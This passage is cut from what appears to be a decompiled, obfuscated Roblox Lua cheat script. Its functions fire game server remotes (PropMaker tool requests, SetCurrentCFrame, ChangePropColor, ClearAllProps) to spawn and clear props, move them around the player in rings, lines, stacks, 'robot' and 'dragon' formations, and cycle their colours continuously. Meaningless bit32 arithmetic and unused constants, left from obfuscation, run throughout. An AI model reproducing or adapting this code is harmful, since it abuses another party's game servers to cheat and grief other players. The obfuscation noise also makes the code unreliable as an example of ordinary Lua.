			end
		end
	end)

	table.insert(upv4, connection)

	for _, child in ipairs(workspaceCom:GetChildren()) do
		if child:IsA("Folder") or child:IsA("Model") then
			local n4 = 280652406

			local connection2 = child.ChildAdded:Connect(function(child2)
				task.wait(0.1)

				if upv1(child2) and upv2 then
					upv3(child2)
				end
			end)

			table.insert(upv4, connection2)
		end
	end
end

-- payload closure created 622-th (proto #t7447)
local function payload_fn_622()
	for i = #upv1, 1, -1 do
		local v = upv1[i]

		if not v or not v.Parent or not v:FindFirstChild("SetCurrentCFrame") then
			table.remove(upv1, i)
		end
	end
end

-- payload closure created 623-th (proto #435)
local function payload_fn_623(arg)
	upv1 = arg

	if upv1 then
		upv2 = {}
		upv3()
		upv4()
		local n2 = 919177362

		upv19 = upv5.Heartbeat:Connect(function()
			local n3 = 3581858634
			if not upv1 then
				return
			end

			if not upv6 or not upv6.Parent then
				return
			end
			local character = upv6.Character
			if not character then
				return
			end
			local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
			if not humanoidRootPart then
				return
			end
			local now = os.clock()
			if now - upv7 < 0.1 then
				return
			end
			upv7 = now
			upv8()
			local n4 = #upv2
			if n4 == 0 then
				return
			end

			if upv9 > n4 then
				upv9 = 1
			end

			for i = 1, math.min(n4, 4) do
				local v = upv9
				upv9 = upv9 % n4 + 1
				local v2 = upv2[v]

				if v2 and v2.Parent and v2:FindFirstChild("SetCurrentCFrame") then
					local n5 = 369501737
					local flag = bit32.bxor(n2, 0) + 345813295 == 165139954
					local n6 = upv10 and os.clock() * upv11 % 360 or 0
					local n7 = 360 / math.max(#upv2, 1)
					local n8 = n5 + 287562376
					local v3 = math.rad((v - 1) * n7 + n6)
					local sin = math.sin
					local v4 = table.pack(bit32.band(n7, 4294967295))
					local v5 = table.pack(bit32.band(v4[1], 65535))
					local v6 = bit32.band(34766 * v5[1] + bit32.lshift(bit32.band(34766 * bit32.rshift(v4[1], 16) + 769 * v5[1], 65535), 16), 4294967295)
					local v7 = table.pack(bit32.band(bit32.bnot(n7), 4294967295))
					local v8 = table.pack(bit32.band(v7[1], 65535))
					local n9 = 4078723664 + n8 + v6 + bit32.band(34766 * v8[1] + bit32.lshift(bit32.band(34766 * bit32.rshift(v7[1], 16) + 769 * v8[1], 65535), 16), 4294967295)
					local n10 = sin(v3) * upv12
					local n11 = math.cos(v3) * upv12
					local n12 = upv13

					if upv14 == "Linha" then
						n10 = (v - (#upv2 + 1) / 2) * upv12 * 1.5
						n11 = 0
					elseif upv14 == "Pilha" then
						n12 = upv13 + (v - 1) * 1.5
						n10 = 0
						n11 = 0
					end

					local cframe = CFrame.Angles
					local n13 = CFrame.new(humanoidRootPart.Position + Vector3.new(n10, n12, n11)) * cframe(math.rad(upv15), v3 + math.rad(upv16) + upv17, math.rad(upv18))

					pcall(function()
						v2.SetCurrentCFrame:InvokeServer(n13)
					end)
				end
			end
		end)
	else
		if upv19 then
			upv19:Disconnect()
			upv19 = nil
		end

		for _, v in ipairs(upv20) do
			v:Disconnect()
		end

		upv20 = {}
		upv2 = {}
	end
end

-- payload closure created 627-th (proto #440)
local function payload_fn_627(arg)
	upv1 = arg

	if upv1 then
		local flag = type(306024310) == "thread"
		local n2 = 365045396

		upv4 = upv2.Heartbeat:Connect(function()
			if upv1 then
				upv3 += 0.1
			end
		end)
	else
		if upv4 then
			upv4:Disconnect()
			upv4 = nil
		end

		upv3 = 0
	end
end

-- payload closure created 629-th (proto #441)
local function payload_fn_629(arg)
	upv1 = arg
end

-- payload closure created 630-th (proto #442)
local function payload_fn_630(arg)
	upv1 = arg

	if upv1 then
		local n2 = 16860649

		upv7 = upv2.Heartbeat:Connect(function()
			local n3 = 4439705007
			if not upv1 then
				return
			end
			local now = os.clock()
			if now - upv3 < 0.15 then
				return
			end
			upv3 = now
			local n4 = tick() * 0.5
			local v = bit32.bxor(n3, 95147624)
			local color = Color3.fromHSV(n4 % 1, 1, 1)
			local n5 = #upv4
			if n5 == 0 then
				return
			end

			if n5 < upv5 then
				upv5 = 1
			end

			for i = 1, math.min(n5, 4) do
				local v2 = upv4[upv5]
				upv5 = upv5 % n5 + 1

				if v2 and v2.Parent and v2:FindFirstChild("ChangePropColor") then
					local n6 = 244710821

					pcall(function()
						v2.ChangePropColor:InvokeServer(color)
					end)
				end
			end

			pcall(function()
				local tbl = { color }
				upv6.PlayerGui:WaitForChild("NoResetGUIHandler"):WaitForChild("PropColorPicker"):WaitForChild("SetColor"):FireServer(unpack(tbl))
			end)
		end)
	elseif upv7 then
		upv7:Disconnect()
		upv7 = nil
	end
end

-- payload closure created 632-th (proto #443)
local function payload_fn_632(arg)
	upv1 = arg or "Círculo"
end

-- payload closure created 633-th (proto #444)
local function payload_fn_633(arg)
	upv1 = arg
end

-- payload closure created 634-th (proto #445)
local function payload_fn_634(arg)
	upv1 = arg
end

-- payload closure created 635-th (proto #446)
local function payload_fn_635(arg)
	upv1 = arg
end

-- payload closure created 636-th (proto #447)
local function payload_fn_636(arg)
	upv1 = arg
end

-- payload closure created 637-th (proto #448)
local function payload_fn_637(arg)
	upv1 = arg
end

-- payload closure created 638-th (proto #449)
local function payload_fn_638(arg)
	upv1 = arg
end

-- payload closure created 639-th (proto #480)
local function payload_fn_639()
	local workspaceCom = workspace:FindFirstChild("WorkspaceCom")
	return workspaceCom and workspaceCom:FindFirstChild("001_TrafficCones")
end

-- payload closure created 640-th (proto #479)
local function payload_fn_640()
	local v = upv1()
	local tbl = {}
	if not v then
		return tbl
	end

	for _, child in ipairs(v:GetChildren()) do
		if child.Name:find(upv2.Name, 1, true) and child:FindFirstChild("SetCurrentCFrame") then
			tbl[#tbl + 1] = child
		end
	end

	return tbl
end

-- payload closure created 641-th (proto #t2887)
local function payload_fn_641(arg, arg2)
	local filterDescendantsInstances = { arg }
	local v = upv1()

	if v then
		filterDescendantsInstances[#filterDescendantsInstances + 1] = v
	end

	local raycastParams = RaycastParams.new()
	raycastParams.FilterDescendantsInstances = filterDescendantsInstances
	raycastParams.FilterType = Enum.RaycastFilterType.Exclude
	local hit = workspace:Raycast(arg2 + Vector3.new(0, 4, 0), Vector3.new(0, -20, 0), raycastParams)
	if hit then
		return hit.Instance, hit.Position
	end
	return nil
end

-- payload closure created 642-th (proto #t8217)
local function payload_fn_642(arg, arg2)
	local propMaker = arg:FindFirstChild("PropMaker") or upv1.Backpack:FindFirstChild("PropMaker")
	local flag = not propMaker

	if flag then
		local n2 = 211678332

		if type(flag) == "userdata" then
		end

		local v = pcall
		local v2 = table.pack(bit32.band(n2, 4294967295))
		local v3 = table.pack(bit32.band(v2[1], 65535))
		local n3 = bit32.band(4808 * v3[1] + bit32.lshift(bit32.band(4808 * bit32.rshift(v2[1], 16) + 27367 * v3[1], 65535), 16), 4294967295) + 3912435720
		local v4 = table.pack(bit32.band(bit32.bor(n2, 380079849), 4294967295))
		local v5 = table.pack(bit32.band(v4[1], 65535))
		local v6 = bit32.band(60729 * v5[1] + bit32.lshift(bit32.band(60729 * bit32.rshift(v4[1], 16) + 38168 * v5[1], 65535), 16), 4294967295)
		local v7 = table.pack(bit32.band(bit32.band(n2, 380079849), 4294967295))
		local v8 = table.pack(bit32.band(v7[1], 65535))
		local n4 = n3 + v6 + bit32.band(60727 * v8[1] + bit32.lshift(bit32.band(60727 * bit32.rshift(v7[1], 16) + 38168 * v8[1], 65535), 16), 4294967295)

		v(function()
			upv2:WaitForChild("RE"):WaitForChild("1Too1l"):InvokeServer("PickingTools", "PropMaker")
		end)

		task.wait(0.5)
		propMaker = arg:FindFirstChild("PropMaker") or upv1.Backpack:FindFirstChild("PropMaker")
	end

	if not propMaker then
		return nil
	end

	if propMaker.Parent ~= arg then
		arg2:EquipTool(propMaker)
		task.wait(0.4)
	end

	return propMaker:FindFirstChild("Tool_PropMake") or propMaker:FindFirstChildWhichIsA("RemoteEvent", true)
end

-- payload closure created 643-th (proto #469)
local function payload_fn_643()
	local n2 = 8875560364

	pcall(function()
		upv1:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllProps")
	end)
end

-- payload closure created 644-th (proto #t4604)
local function payload_fn_644(arg, arg2, arg3, arg4, filter, arg5)
	local n2 = 1021334375
	local n3 = 3606755846
	local n4 = 838875679

	if arg5 then
		arg.clearRemote:FireServer("RequestingPropName", arg2, arg3)
	else
		arg.clearRemote:FireServer("RequestingPropName", arg2, arg3, filter or "Work")
	end

	task.wait(0.35)
	local tbl = {}

	for _, v in ipairs(upv1()) do
		tbl[v] = true
	end

	local v, v2 = upv2(arg.character, arg4)

	if not v then
		v, v2 = upv2(arg.character, arg.rootPart.Position)
	end

	if not v then
		return nil
	end
	arg.propRemote:FireServer(v, Vector3.new(v2.X, v2.Y, v2.Z))
	local now = os.clock()
	local n5 = now + 5

	while true do
		task.wait(0.08)

		for _, v3 in ipairs(upv1()) do
			if not tbl[v3] then
				local v4 = upv3
				local tbl2 = { name = arg2, category = arg3 }
				filter = filter or "Work"
				tbl2.filter = filter
				tbl2.hasFilter = not arg5
				v4[v3] = tbl2
				return v3
			end
		end

		if not (n5 <= os.clock()) then
			continue
		end
		break
	end

	return nil
end

-- payload closure created 645-th (proto #468)
local function payload_fn_645()
	local character = upv1.Character
	local humanoid = character and character:FindFirstChildOfClass("Humanoid")
	local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
	if not humanoid or not humanoidRootPart then
		return nil
	end
	upv2()
	local n2 = os.clock() + 5

	while true do
		task.wait(0.2)
		if not (#upv3() == 0 or os.clock() >= n2) then
			continue
		end
		break
	end

	local v = upv4(character, humanoid)
	local re = upv5:FindFirstChild("RE")
	re = re and re:FindFirstChild("1Clea1rTool1s")
	if not v or not re then
		return nil
	end
	return { character = character, humanoid = humanoid, rootPart = humanoidRootPart, propRemote = v, clearRemote = re }
end

-- payload closure created 646-th (proto #477)
local function payload_fn_646(arg, arg2)
	if type(arg) ~= "table" or #arg ~= arg2 then
		return false
	end

	for _, v in ipairs(arg) do
		if not v.prop or not v.prop.Parent or not v.prop:FindFirstChild("SetCurrentCFrame") then
			return false
		end
	end

	return true
end

-- payload closure created 647-th (proto #t5428)
local function payload_fn_647(arg, arg2)
	return (arg.Position - arg2.Position).Magnitude > 0.03 or arg.LookVector:Dot(arg2.LookVector) < 0.9999 or arg.UpVector:Dot(arg2.UpVector) < 0.9999
end

-- payload closure created 648-th (proto #451)
local function payload_fn_648()
	if upv1 then
		upv1:Disconnect()
		upv1 = nil
	end

	upv2 = nil
end

-- payload closure created 649-th (proto #t847)
local function payload_fn_649(arg, arg2, arg3, arg4)
	upv1()
	local n2 = 627538599

	for _, v in ipairs(arg2) do
		v.lastSent = nil
	end

	upv2 = arg
	local n3 = arg4 and 0.05 or 0.28
	local tbl = {}
	local n4 = n2 - 371566107
	local n5 = 0
	local n6 = 0
	local n7 = 0
	local n8 = 0

	upv7 = upv3.Heartbeat:Connect(function(deltaTime)
		n5 += deltaTime
	end)
end

-- payload closure created 650-th (proto #450)
local function payload_fn_650(arg, arg2, arg3)
	local tbl = {}

	for i, v in ipairs(arg3) do
		local v2 = v[1]
		local str = v[3]
		local v3 = v[4]
		local v4 = v[5]

		if str:find("Leg") or str:find("Arm") then
			str = (v3.X < 0 and "Left" or "Right") .. str
		end

		tbl[i] = {
			kind = v2,
			part = str,
			rest = CFrame.new(v3) * (v4 or CFrame.identity) * CFrame.new(-upv1[v2]),
		}
	end

	return tbl
end

-- payload closure created 651-th (proto #t5487)
local function payload_fn_651(arg, arg2, arg3)
	local v = arg[arg2]
	return v * arg3 * v:Inverse()
end

-- payload closure created 652-th (proto #t7519)
local function payload_fn_652(arg, arg2)
	local v = upv1(arg2, "Root", arg.Root)
	local n2 = v * upv1(arg2, "Waist", arg.Waist)
	local tbl = { LowerTorso = v, UpperTorso = n2, Head = n2 * upv1(arg2, "Neck", arg.Neck) }

	for _, v2 in ipairs({ "Left", "Right" }) do
		local n3 = n2 * upv1(arg2, v2 .. "Shoulder", arg[v2 .. "Shoulder"])
		tbl[v2 .. "UpperArm"] = n3
		tbl[v2 .. "LowerArm"] = n3 * upv1(arg2, v2 .. "Elbow", arg[v2 .. "Elbow"])
		local n4 = v * upv1(arg2, v2 .. "Hip", arg[v2 .. "Hip"])
		tbl[v2 .. "UpperLeg"] = n4
		tbl[v2 .. "LowerLeg"] = n4 * upv1(arg2, v2 .. "Knee", arg[v2 .. "Knee"])
	end

	return tbl
end

-- payload closure created 653-th (proto #t4023)
local function payload_fn_653()
	local tbl = {}

	for _, v in ipairs(upv1) do
		tbl[v] = CFrame.identity
	end

	return tbl
end

-- payload closure created 654-th (proto #t6645)
local function payload_fn_654(arg, arg2, arg3)
	if arg3 <= 0.001 then
		return arg
	end

	if arg3 >= 0.999 then
		return arg2
	end
	local tbl = {}

	for _, v in ipairs(upv1) do
		tbl[v] = arg[v]:Lerp(arg2[v], arg3)
	end

	return tbl
end

-- payload closure created 655-th (proto #t2104)
local function payload_fn_655(arg, arg2)
	local v = math.sin(arg * 2.1)
	local v2 = upv1()
	v2.Root = CFrame.new(0, v * 0.08 * arg2, 0)
	v2.Waist = CFrame.Angles(v * 0.02, math.sin(arg * 0.7) * 0.04, 0)
	v2.Neck = CFrame.Angles(0, math.sin(arg * 0.55) * 0.2, 0)
	v2.LeftShoulder = CFrame.Angles(0, 0, -0.07 - v * 0.035)
	v2.RightShoulder = CFrame.Angles(0, 0, 0.07 + v * 0.035)
	v2.LeftElbow = CFrame.Angles(0.12, 0, 0)
	v2.RightElbow = CFrame.Angles(0.12, 0, 0)
	return v2
end

-- payload closure created 656-th (proto #t6100)
local function payload_fn_656(arg, arg2)
	local v = math.sin(arg)
	local v2 = math.cos(arg)
	local v3 = upv1()
	v3.Root = CFrame.new(0, math.abs(v2) * 0.3 * arg2, 0) * CFrame.Angles(0, v * 0.05, 0)
	v3.Waist = CFrame.Angles(-0.06, -v * 0.08, 0)
	v3.LeftHip = CFrame.Angles(v * 0.5, 0, 0)
	v3.RightHip = CFrame.Angles(-v * 0.5, 0, 0)
	v3.LeftKnee = CFrame.Angles(-math.max(0, v2) * 0.7, 0, 0)
	v3.RightKnee = CFrame.Angles(-math.max(0, -v2) * 0.7, 0, 0)
	v3.LeftShoulder = CFrame.Angles(-v * 0.45, 0, -0.06)
	v3.RightShoulder = CFrame.Angles(v * 0.45, 0, 0.06)
	v3.LeftElbow = CFrame.Angles(0.3, 0, 0)
	v3.RightElbow = CFrame.Angles(0.3, 0, 0)
	return v3
end

-- payload closure created 657-th (proto #t4559)
local function payload_fn_657(arg)
	local v = upv1[arg]
	if v then
		return v
	end
	local tbl = {}

	for _, descendant in ipairs(arg:GetDescendants()) do
		local flag = upv2[descendant.Name] and not tbl[descendant.Name]
		local isMotor6D

		if flag then
			isMotor6D = descendant:IsA("Motor6D") or descendant.ClassName == "AnimationConstraint"
		else
			isMotor6D = flag
		end

		if isMotor6D then
			tbl[descendant.Name] = descendant
		end
	end

	upv1[arg] = tbl
	return tbl
end

-- payload closure created 658-th (proto #t1671)
local function payload_fn_658(arg, arg2)
	local v = upv1(arg)
	if not v.Waist or not v.Waist.Parent then
		upv2[arg] = nil
		return nil
	end
	local v2 = upv3()

	for _, v3 in ipairs(upv4) do
		local v4 = v[v3]

		if v4 then
			local n2 = 777452034

			local ok2, result2 = pcall(function()
				return v4.Transform
			end)

			if ok2 and result2 then
				if v3 == "Root" then
					v2.Root = result2.Rotation + result2.Position * arg2
				else
					v2[v3] = result2.Rotation
				end
			end
		end
	end

	return v2
end

-- payload closure created 659-th (proto #t1599)
local function payload_fn_659(arg)
	return arg and tostring(arg.AnimationId):match("%d+")
end

-- payload closure created 660-th (proto #t3432)
local function payload_fn_660(character, arg)
	local n2 = 454121357
	local now = os.clock()

	if upv1.character ~= character or now - upv1.at > 3 then
		local ids = {}
		local animate = character:FindFirstChild("Animate")

		if animate then
			for _, child in ipairs(animate:GetChildren()) do
				if upv2[child.Name:lower()] then
					for _, child2 in ipairs(child:GetChildren()) do
						local isAnimation = child2:IsA("Animation") and upv3(child2)

						if isAnimation then
							ids[isAnimation] = true
						end
					end
				end
			end
		end

		local v = upv1
		local v2 = upv1
		upv1.character = character
		v.ids = ids
		v2.at = now
	end

	local animator = arg:FindFirstChildOfClass("Animator")
	if not animator then
		return false
	end

	for _, v in ipairs(animator:GetPlayingAnimationTracks()) do
		local animation = v.Animation

		if v.WeightCurrent > 0.3 and v.Priority ~= Enum.AnimationPriority.Core and animation and not animation:FindFirstAncestorOfClass("Tool") then
			local v2 = upv3(animation)
			if v2 and not upv1.ids[v2] then
				return true
			end
		end
	end

	return false
end

-- payload closure created 661-th (proto #481)
local function payload_fn_661(arg, arg2, arg3)
	local n2 = 2991127794
	local n3 = 832164758
	local n4 = 2822206690
	local lookVector = arg.CFrame.LookVector
	local vector_ = Vector3.new(lookVector.X, 0, lookVector.Z)
	local unit = vector_.Magnitude > 0.001 and vector_.Unit or Vector3.new(0, 0, -1)
	local rigType = arg2.RigType
	local v = Enum
	local n5 = 2

	if rigType == v.HumanoidRigType.R15 then
		n5 = arg2.HipHeight
	end

	local n6 = arg.Position.Y - n5 - arg.Size.Y / 2
	local assemblyLinearVelocity = arg.AssemblyLinearVelocity
	local n7 = Vector3.new(assemblyLinearVelocity.X, 0, assemblyLinearVelocity.Z) * upv1
	local n8 = Vector3.new(arg.Position.X, n6, arg.Position.Z) + n7
	local v2 = table.pack(bit32.band(n3, 4294967295))
	local v3 = table.pack(bit32.band(v2[1], 65535))
	bit32.band(v3[1] * 59305 + bit32.lshift(bit32.band(v3[1] * 0 + bit32.rshift(v2[1], 16) * 59305, 65535), 16), 4294967295)
	local n9 = n8 - unit * arg3
	return CFrame.lookAt(n9, n9 + unit)
end

-- payload closure created 662-th (proto #471)
local function payload_fn_662(arg)
	local functional = arg:FindFirstChild("Functional")
	local n2 = 724997167
	if functional or arg:FindFirstChild("ExplodableHitbox") then
		return "PowerTurbine"
	end
	local n3 = n2 - 286765241

	local ok2, result2, result3 = pcall(function()
		return arg:GetBoundingBox()
	end)

	if not ok2 or not result3 then
		return nil
	end

	if result3.Y < 2 and result3.X > 4 then
		return "CarTruckLightsOrange"
	end
	local n4 = 0

	for _, child in ipairs(arg:GetChildren()) do
		if child.Name == "Touch" then
			n4 += 1
		end
	end

	if n4 >= 40 then
		return "Sandbags02"
	end

	if n4 >= 21 and result3.X > 26 and result3.Y < 5 then
		return "Sandbags01"
	end
	return nil
end

-- payload closure created 663-th (proto #473)
local function payload_fn_663(arg)
	local attribute = arg:GetAttribute("id")
	return upv1[attribute] and attribute or nil
end

-- payload closure created 664-th (proto #478)
local function payload_fn_664(arg, arg2, arg3)
	local tbl = {}

	for _, v in ipairs(upv1()) do
		local v2 = arg.getKind(v)

		if v2 then
			tbl[v2] = tbl[v2] or {}
			table.insert(tbl[v2], v)
		end
	end

	local v = upv2(arg2, arg3, arg.behindDistance)
	local tbl2 = {}

	for i, piece in ipairs(arg.pieces) do
		local v2 = tbl[piece.kind]
		if not v2 or #v2 == 0 then
			return nil
		end
		local position = (v * piece.rest).Position
		local v3 = nil
		local v4 = nil

		for i2, v5 in ipairs(v2) do
			local magnitude = (v5:GetPivot().Position - position).Magnitude

			if not v3 or magnitude < v3 then
				v3 = magnitude
				v4 = i2
			end
		end

		tbl2[i] = { prop = table.remove(v2, v4), part = piece.part, rest = piece.rest }
	end

	return tbl2
end

-- payload closure created 665-th (proto #467)
local function payload_fn_665(arg)
	local n2 = 1192627760
	local n3 = 871479819
	if upv1 then
		return
	end
	upv1 = true
	upv2()
	upv3.CoquetteBuildLayout = nil
	local v = upv4()
	if not v then
		upv1 = false
		return
	end
	local tbl = {}

	for i, prop in ipairs(arg.props) do
		local v2 = arg.pieces[i]
		local n4 = 477199005
		local v3 = prop[6]
		local v4 = upv6(v, prop[1], prop[2], upv5(v.rootPart, v.humanoid, arg.behindDistance).Position, v3)
		if not v4 then
			upv1 = false
			return
		end

		pcall(function()
			local rest = v2.rest
			v4.SetCurrentCFrame:InvokeServer(upv5(v.rootPart, v.humanoid, arg.behindDistance) * rest)
		end)

		tbl[i] = { prop = v4, part = v2.part, rest = v2.rest }
		task.wait(0.2)
	end

	upv3.CoquetteBuildLayout = { mode = arg.mode, items = tbl }
	upv1 = false
end

-- payload closure created 666-th (proto #t4149)
local function payload_fn_666(arg)
	local n2 = 0
	local n3 = 0
	local n4 = 0
	local n5 = 0
	local n6 = 156179467
	local v = nil
	local v2 = nil

	return function(arg2, arg3, arg4, arg5)
		local n7 = 1009428250
		local v3 = bit32.bxor(n6, 81312227)
		local n8 = 274274811
		n2 += arg2
		local assemblyLinearVelocity = arg5.AssemblyLinearVelocity
		local magnitude = Vector3.new(assemblyLinearVelocity.X, 0, assemblyLinearVelocity.Z).Magnitude
		local flag = magnitude > 2 and arg4.FloorMaterial ~= Enum.Material.Air
		local n9

		if flag then
			n8 = n8 + 894471026 - 894471026
			n9 = math.clamp(magnitude / 12, 0.45, 1)
		else
			n9 = flag
		end

		n4 += ((n9 or 0) - n4) * math.min(1, arg2 * 6)
		local v4 = upv1(arg5, arg4, arg.behindDistance)
		local n10 = v3 + 2659756241

		if v then
			if arg4.FloorMaterial == Enum.Material.Air then
				v4 -= Vector3.new(0, v4.Position.Y - v.Position.Y, 0)
				n8 = n8 // n10 - 4020692485
			end

			local n11 = v4.Position - v.Position

			if n11.Magnitude < 0.12 and v4.LookVector:Dot(v.LookVector) > 0.9997 then
				v4 = v
			end
		end

		local v5

		if upv2 and v2 and (v4.Position - v2.Position).Magnitude < 40 then
			v5 = v2:Lerp(v4, 1 - math.exp(-arg2 * 9))
		else
			v5 = v4
		end

		v2 = v5
		v = v5
		n5 += ((upv3(arg3, arg4) and 1 or 0) - n5) * math.min(1, arg2 * 8)
		local v6 = upv4(upv5(n2, arg.motionScale), upv6(n3, arg.motionScale), n4)
		local v7 = upv8
		local v8 = arg
		local v9 = v7(v6, v8.pivots)
		local tbl = {}

		for i, piece in ipairs(arg.pieces) do
			tbl[i] = v5 * v9[piece.part] * piece.rest
		end

		return tbl
	end
end

-- payload closure created 667-th (proto #476)
local function payload_fn_667(arg, arg2)
	if not arg2 then
		if upv1 == arg.mode then
			upv2()
		end

		return
	end

	local character = upv3.Character
	local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
	character = character and character:FindFirstChildOfClass("Humanoid")
	if not humanoidRootPart or not character then
		return
	end
	local coquetteBuildLayout = upv4.CoquetteBuildLayout
	local items = coquetteBuildLayout and coquetteBuildLayout.mode == arg.mode and coquetteBuildLayout.items

	if not upv5(items, #arg.props) then
		items = upv6(arg, humanoidRootPart, character)
		if not items then
			return
		end
		upv4.CoquetteBuildLayout = { mode = arg.mode, items = items }
	end

	upv7(arg.mode, items, upv8(arg), upv9)
end

-- payload closure created 668-th (proto #t2464)
local function payload_fn_668(arg)
	local v = arg[3]
	if v == "body" then
		return upv1:Lerp(upv2, math.clamp(arg[4] / 106, 0, 1))
	end

	if v == "head" then
		return arg[1] == "ConstructionLight" and Color3.fromRGB(8, 8, 10) or nil
	end
	return upv3[v]
end

-- payload closure created 669-th (proto #t2356)
local function payload_fn_669(arg, arg2)
	local n2 = 0
	local n3 = arg2.Position + Vector3.new(55, 30, 0)
	local vector_ = Vector3.new(0, 0, -upv3 * 0.3)
	local n4 = 495947701
	local n5 = math.floor(upv4 * 1.5) + 20
	local tbl = {}

	local function fn(arg3)
		n3 = arg3
		tbl = {}

		for i = 0, upv4 + 10, 2 do
			tbl[#tbl + 1] = arg3 + Vector3.new(0, 0, i)
		end
	end

	fn(n3)

	local function fn2()
		local tbl2 = {}
		local n6 = #tbl
		local n7 = 1
		local n8 = 0

		for _, v in ipairs(upv5) do
			local magnitude = n7 < n6 and (tbl[n7 + 1] - tbl[n7]).Magnitude
			local v2

			if magnitude then
				v2 = n7
			else
				magnitude = 0
				v2 = n7
			end

			while v2 < n6 and n8 + magnitude < v do
				n8 += magnitude
				v2 += 1
				magnitude = v2 < n6 and (tbl[v2 + 1] - tbl[v2]).Magnitude or 0
			end

			if v2 >= n6 or magnitude <= 0 then
				tbl2[v] = tbl[v2]
				n7 = v2
			else
				tbl2[v] = tbl[v2]:Lerp(tbl[v2 + 1], (v - n8) / magnitude)
				n7 = v2
			end
		end

		return tbl2
	end

	local function fn3(arg3)
		return Vector3.new(0, math.sin(n2 * 2.4 - arg3 * 0.05) * 2.8 * math.min(1, arg3 / 20), 0)
	end

	local function fn4(arg3, arg4, arg5, arg6)
		local v = bit32.bxor(n4, 1236514794)
		local n6 = 2396102227
		n2 += arg3
		local n7 = n2 * upv7
		local position = arg6.Position
		local vector_2 = Vector3.new
		local n8 = math.cos(n7) * upv1
		local v2 = upv2
		local sin = math.sin
		local v3 = n2
		local v4 = bit32.band(v, 3779124625)
		local n9 = position + vector_2(n8, v2 + sin(v3 * 0.9) * 7, math.sin(n7) * upv1)

		if (n9 - n3).Magnitude > 400 then
			fn(n9)
		end

		local cos = math.cos
		local n10 = n6 - 1116474338
		local n11 = Vector3.new(-math.sin(n7), 0, cos(n7)) * upv1 * upv7 + (n9 - n3) * 1.2

		if upv3 < n11.Magnitude then
			n11 = n11.Unit * upv3
			n10 = bit32.bxor(bit32.bxor(n10, 4294967295), 4294967295)
		end

		vector_ = vector_:Lerp(n11, math.min(1, arg3 * 2.5))

		if vector_.Magnitude < 12 then
			vector_ = (vector_.Magnitude > 0.01 and vector_.Unit or Vector3.new(0, 0, -1)) * 12
		end

		n3 += vector_ * arg3

		if (tbl[1] - n3).Magnitude >= 1 then
			local n12 = v4 + 2156134431
			table.insert(tbl, 1, n3)

			while #tbl > n5 do
				table.remove(tbl)
			end

			v4 = bit32.bxor(n12, 2156134433)
		end

		local v5 = fn2()
		local tbl2 = {}
		local n12 = math.sin(n2 * 3.2) * 0.5 + 0.1
		local cframe = CFrame.Angles(0, math.sin(n2 * 2) * 0.35, 0)
		local unit = vector_.Unit
		local tbl3 = {}

		for i, v6 in ipairs(upv8) do
			local v7 = v6[4]
			local cframe2 = tbl2[v7]

			if not cframe2 then
				local n13 = v5[v7] + fn3(v7)
				local n14 = v7 >= 1 and v5[v7 - 1] + fn3(v7 - 1) or n13 + unit

				if (n14 - n13).Magnitude < 0.01 then
					n14 = n13 + Vector3.new(0, 0, -1)
				end

				cframe2 = CFrame.lookAt(n13, n14)
				tbl2[v7] = cframe2
			end

			local v8 = v6[3]
			local n13

			if v8 == "wing" then
				n13 = cframe2 * CFrame.new(0, 3.5, 0) * CFrame.Angles(0, 0, v6[6] * n12) * CFrame.new(0, -upv9, 0)
			elseif v8 == "tail" then
				n13 = cframe2 * cframe
			else
				n13 = cframe2
			end

			tbl3[i] = n13 * v6[5]
		end

		return tbl3
	end

	upv6("dragon", arg, fn4, upv10)
end

-- payload closure created 670-th (proto #484)
local function payload_fn_670()
	local n2 = 1007477378
	local n3 = 4234314429
	if upv1 then
		return
	end
	local character = upv2.Character
	character = character and character:FindFirstChild("HumanoidRootPart")
	if not character then
		return
	end
	local coquetteBuildLayout = upv3.CoquetteBuildLayout
	local items = coquetteBuildLayout and coquetteBuildLayout.mode == "dragon" and coquetteBuildLayout.items
	local n4 = #upv5
	local v = upv4(items, n4)
	if v then
		upv6(items, character)
		return
	end
	upv1 = true
	upv7()
	upv3.CoquetteBuildLayout = nil
	local v2 = upv8()
	if not v2 then
		upv1 = false
		return
	end
	local tbl = {}

	for i, v3 in ipairs(upv5) do
		local lookVector = v2.rootPart.CFrame.LookVector
		local v4 = table.pack(bit32.band(n4, 4294967295))
		local v5 = table.pack(bit32.band(v4[1], 65535))
		local v6 = bit32.band(15782 * v5[1] + bit32.lshift(bit32.band(15782 * bit32.rshift(v4[1], 16) + 27644 * v5[1], 65535), 16), 4294967295)
		local v7 = table.pack(bit32.band(bit32.bnot(n4), 4294967295))
		local v8 = table.pack(bit32.band(v7[1], 65535))
		local n5 = 2335924648 + v6 + bit32.band(15782 * v8[1] + bit32.lshift(bit32.band(15782 * bit32.rshift(v7[1], 16) + 27644 * v8[1], 65535), 16), 4294967295) + 236658620
		local v9 = upv9(v2, v3[1], v3[2], v2.rootPart.Position - Vector3.new(lookVector.X, 0, lookVector.Z).Unit * 20)
		if not v9 then
			upv1 = false
			return
		end

		pcall(function()
			v9.SetCurrentCFrame:InvokeServer(v2.rootPart.CFrame * CFrame.new(0, 30 + i * 3, 25))
		end)

		local v10 = upv10(v3)
		local changePropColor = v10 and v9:FindFirstChild("ChangePropColor")

		if changePropColor then
			pcall(changePropColor.InvokeServer, changePropColor, v10)
		end

		tbl[i] = { prop = v9 }
		task.wait(0.2)
	end

	upv3.CoquetteBuildLayout = { mode = "dragon", items = tbl }
	upv1 = false
	upv6(tbl, v2.rootPart)
end

-- payload closure created 671-th (proto #465)
local function payload_fn_671(arg)
	upv1 = arg

	if upv2 == "robot" or upv2 == "robot2" then
		upv3(upv4[upv2], true)
	elseif upv2 == "dragon" then
		local coquetteBuildLayout = upv5.CoquetteBuildLayout
		local character = upv6.Character
		character = character and character:FindFirstChild("HumanoidRootPart")

		if character and coquetteBuildLayout and upv7(coquetteBuildLayout.items, #upv8) then
			upv9(coquetteBuildLayout.items, character)
		end
	end
end

-- payload closure created 672-th (proto #475)
local function payload_fn_672(arg)
	if not arg then
		if upv1 == "robot" or upv1 == "robot2" then
			upv2()
		end

		return
	end

	local coquetteBuildLayout = upv3.CoquetteBuildLayout
	coquetteBuildLayout = coquetteBuildLayout and upv4[coquetteBuildLayout.mode]
	if coquetteBuildLayout then
		upv5(coquetteBuildLayout, true)
		return
	end
	upv5(upv4.robot, true)

	if upv1 ~= "robot" then
		upv5(upv4.robot2, true)
	end
end

-- payload closure created 673-th (proto #482)
